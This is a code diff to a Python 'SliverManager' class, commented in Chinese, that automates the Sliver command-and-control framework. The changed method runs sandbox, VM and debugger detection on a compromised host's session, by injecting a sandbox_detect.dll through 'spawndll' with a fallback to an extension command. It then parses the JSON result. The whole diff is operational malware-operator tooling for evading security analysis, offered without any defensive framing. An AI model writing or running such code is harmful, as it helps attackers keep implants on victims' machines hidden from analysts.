@@ -121,23 +121,45 @@ class SliverManager:
         """在目标上执行沙箱检测"""
         print(f"[*] 在会话 {session_id} 上执行沙箱检测...")
 
-        # 通过 Sliver CLI 执行扩展
-        commands = f"use {session_id}\nsandbox-detect"
+        # 方法1：通过 Sliver CLI 使用 spawndll 执行 sandbox_detect.dll
+        dll_path = os.path.expanduser("~/.sliver-client/extensions/sandbox-detect/sandbox_detect.dll")
+        dll_path = dll_path.replace("\\", "/")
+        commands = f"use {session_id}\nspawndll --export go {dll_path}"
         output = self._run_sliver_command(commands)
 
         # 解析 JSON 输出
         try:
-            # 尝试从输出中提取 JSON
-            json_start = output.find('{')
-            json_end = output.rfind('}') + 1
+            json_start = output.find('{"')
+            if json_start >= 0:
+                depth = 0
+                json_end = json_start
+                for i in range(json_start, len(output)):
+                    if output[i] == '{':
+                        depth += 1
+                    elif output[i] == '}':
+                        depth -= 1
+                        if depth == 0:
+                            json_end = i + 1
+                            break
+                if json_end > json_start:
+                    return json.loads(output[json_start:json_end])
+        except:
+            pass
+
+        # 方法2：如果 spawndll 失败，尝试使用扩展命令
+        commands2 = f"use {session_id}\nsandbox-detect"
+        output2 = self._run_sliver_command(commands2)
+        try:
+            json_start = output2.find('{')
+            json_end = output2.rfind('}') + 1
             if json_start >= 0 and json_end > json_start:
-                json_str = output[json_start:json_end]
+                json_str = output2[json_start:json_end]
                 return json.loads(json_str)
         except:
             pass
 
         return {
-            "raw_output": output,
+            "raw_output": output + "\n---\n" + output2,
             "vm_detected": False,
             "sandbox_detected": False,
             "debugger_detected": False,
